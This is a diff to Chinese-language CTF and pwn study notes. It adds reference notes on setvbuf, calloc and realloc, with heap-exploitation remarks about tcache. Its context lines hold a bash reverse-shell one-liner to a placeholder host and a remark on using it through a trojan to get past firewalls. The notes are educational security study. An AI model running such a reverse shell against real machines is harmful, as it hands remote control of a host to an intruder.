@@ -27,6 +27,42 @@ bash -i >& /dev/tcp/主机A的IP/主机A监听的端口 0>&1
 
 “反弹”`shell`的意思就是，这个`shell`是由主机`B`主动发起连接让主机`A`使用主机`B`的`shell`的，因此不会被防火墙等阻拦。若我们能通过木马等方式控制某台主机并执行一次命令，那么我们即可反弹一个`shell`。
 
+# 常见函数
+
+## setvbuf函数
+
+```c
+setvbuf(steam, buf, mode, size);
+// setvbuf可以设置文件流的缓冲模式。
+// stream表示设置哪一个流，例如stdin、stdout
+// buf表示自定义缓冲区的位置，设置为0表示不要自定义缓冲区而是C语言分配
+// mode分为三种，全缓冲_IOFBF为0， _IOLBF为1，_IONBF为2
+// size表示缓冲区大小，若缓冲区是C语言分配，则该值设置为缓冲区大小。若缓冲区是自定义的，该值需要与自定义缓冲区相匹配。
+// setvbuf(stdin, 0, 2, 0);表示将stdin设置为无缓冲模式
+```
+
+## calloc函数
+
+```c
+calloc(num_elements, element_size);
+// calloc函数可以动态分配内存，且分配的区域会自动初始化为0
+// calloc函数不会申请到tcache中的内存空间
+// num_elemtents表示要分配的元素数量
+// element_size表示每个元素的大小（单位是字节）
+// 实际申请的内存空间为num_elements * element_size（不加header）
+```
+
+## realloc函数
+
+```c
+realloc(ptr, new_size);
+// realloc函数可以重新调整之前分配的内存块的大小。
+// 若ptr为0且new_size > 0，则相当于malloc(new_size)
+// 若new_size为0，则会将ptr进行free
+// 若new_size小于之前的size，相当于edit
+// 若new_size大于之前的size，会malloc新内存，将以前内容复制到新内存，将以前内存free
+```
+
 # Linux查找文件
 
 ```bash
